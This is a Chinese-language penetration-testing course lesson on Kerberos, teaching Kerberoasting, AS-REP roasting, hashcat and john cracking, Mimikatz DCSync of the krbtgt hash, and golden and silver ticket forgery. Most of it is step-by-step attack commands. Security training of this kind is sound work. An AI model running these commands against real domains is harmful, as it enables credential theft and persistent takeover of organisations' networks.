---
title: Day069：内网渗透 - Kerberos 认证与票据攻击
tags:
  - 网络安全
  - 渗透测试
  - 内网渗透
categories:
  - 90天安全突击
stage: 实战演练
abbrlink: f60d4
date: 2026-01-28
updated: 2026-01-28
---

# Day069：内网渗透 - Kerberos 认证与票据攻击

## 📋 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 🏆 实战演练（第三阶段） |
| **所属周次** | Week 11-12：内网渗透基础 |
| **今日主题** | Kerberos 认证与票据攻击 |
| **预计时间** | 4 小时 |
| **难度等级** | ⭐⭐⭐⭐⭐ 高级 |

---

## 🔥 今日痛点场景

> **场景**：目标域禁用了 NTLM 认证，PTH 失效了。你拿到了域管的 Hash，但没法直接用。
>
> **问题**：不能用 NTLM，还有什么方法？
>
> **今天的任务**：理解 Kerberos 认证，掌握黄金票据和 Kerberoasting 攻击。

---

## 🎯 今日目标

- [ ] 理解 Kerberos 认证流程
- [ ] 学会 Kerberoasting 攻击
- [ ] 理解黄金票据和白银票据
- [ ] 实战伪造票据攻击

**闯关条件**：成功执行 Kerberoasting 并破解至少一个服务账户密码。

---

## ⚔️ 实战任务（先动手！）

### 任务 1：理解 Kerberos 认证流程（30 分钟）

```
┌────────┐     1. AS-REQ      ┌────────┐
│ 客户端  │ ───────────────→  │   DC   │
│        │ ←───────────────  │  (KDC) │
└────────┘     2. AS-REP      └────────┘
                (TGT)              │
     │                             │
     │ 3. TGS-REQ (TGT)           │
     │ ─────────────────────────→ │
     │                             │
     │ 4. TGS-REP (ST)            │
     │ ←───────────────────────── │
     │
     │ 5. 使用 ST 访问服务
     │ ─────────────────────────→ 服务器
```

**关键概念**：
- **TGT**：票据授权票据，证明你是谁
- **ST**：服务票据，用于访问特定服务
- **KDC**：密钥分发中心（通常是域控）

---

### 任务 2：Kerberoasting 攻击（60 分钟）

**原理**：请求服务票据（ST），离线破解服务账户密码。

**步骤 1：查找具有 SPN 的账户**

```powershell
# PowerView
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname

# 或用 setspn
setspn -T corp -Q */*
```

**步骤 2：请求服务票据**

```powershell
# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# 或 Impacket
proxychains4 impacket-GetUserSPNs corp.local/user:password -dc-ip 10.0.0.1 -request
```

**步骤 3：破解 Hash**

```bash
# 使用 hashcat
hashcat -m 13100 hashes.txt rockyou.txt

# 使用 john
john --format=krb5tgs hashes.txt --wordlist=rockyou.txt
```

---

### 任务 3：AS-REP Roasting（30 分钟）

**原理**：针对不需要预认证的账户，请求 AS-REP 离线破解。

```bash
# 查找不需要预认证的用户
proxychains4 impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.0.0.1

# 破解
hashcat -m 18200 asrep.txt rockyou.txt
```

---

### 任务 4：黄金票据攻击（45 分钟）

**前提**：已获取 krbtgt 账户的 Hash（需要域管权限）。

**步骤 1：获取 krbtgt Hash**

```cmd
# Mimikatz DCSync
lsadump::dcsync /user:krbtgt
```

**步骤 2：伪造黄金票据**

```cmd
# Mimikatz
kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:hash /ptt

# /ptt 表示直接注入内存
```

**步骤 3：使用票据访问**

```cmd
# 验证
klist

# 访问域控
dir \\dc01\c$
```

---

### 任务 5：白银票据攻击（30 分钟）

**前提**：已获取目标服务账户的 Hash。

```cmd
# 伪造访问 CIFS 服务的票据
kerberos::golden /user:fakeuser /domain:corp.local /sid:S-1-5-21-xxx /target:fileserver.corp.local /service:cifs /rc4:servicehash /ptt
```

**区别**：白银票据只能访问特定服务，不需要和 DC 通信。

---

## ✅ 今日闯关检查

| 检查项 | 状态 |
|--------|------|
| 理解 Kerberos 认证流程 | ⬜ |
| Kerberoasting 成功 | ⬜ |
| 破解服务账户密码 | ⬜ |
| 理解黄金/白银票据区别 | ⬜ |
| 伪造票据成功（可选） | ⬜ |

---

## 📖 底层补课（做完实验再看）

### 黄金票据 vs 白银票据

| 特性 | 黄金票据 | 白银票据 |
|------|----------|----------|
| 需要的 Hash | krbtgt | 服务账户 |
| 票据类型 | TGT | ST |
| 访问范围 | 整个域 | 特定服务 |
| 需要联系 DC | 是 | 否 |
| 隐蔽性 | 低 | 高 |

### Kerberoasting 为什么有效？

1. 任何域用户都能请求 ST
2. ST 用服务账户密码加密
3. 服务账户往往使用弱密码
4. 可离线破解，无日志

---

## ⚠️ 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| SPN 找不到 | 返回空 | 确认有域用户权限 |
| 票据注入失败 | 时间偏差 | 同步时间 |
| 破解不出来 | 密码太强 | 换更大的字典 |

---

## 💡 知识卡片速查

### Kerberos 攻击方法

| 攻击 | 前提 | 目标 |
|------|------|------|
| Kerberoasting | 域用户 | 服务账户密码 |
| AS-REP Roasting | 无需预认证账户 | 用户密码 |
| 黄金票据 | krbtgt Hash | 持久化控制 |
| 白银票据 | 服务账户 Hash | 特定服务访问 |

---

## 🚀 明日预告

**Day 070：内网渗透 - 域控攻击与 DCSync**

明天你将：
- 使用 DCSync 导出所有域用户 Hash
- 学习域控攻击技术
- 实现域内持久化

---

## 📊 学习记录（学习者填写）

| 项目 | 内容 |
|------|------|
| 实际学习日期 | ____年__月__日 |
| 实际用时 | ____ 小时 |
| 遇到的问题 | |
| 解决方法 | |
| 今日收获 | |
| 自评分数 | ⭐⭐⭐⭐⭐ (1-5星) |

---

> 💬 **导师点评**：
>
> Kerberos 攻击是域渗透的高级技能。Kerberoasting 实战中非常好用，因为服务账户密码往往很弱。
>
> 黄金票据是终极后门，拿到 krbtgt Hash 就等于拥有了域的永久控制权。
>
> 这一天内容多，不理解很正常。多查资料，多实验。

```bash
echo "Day 069 Complete! Kerberos 攻击入门！"
```
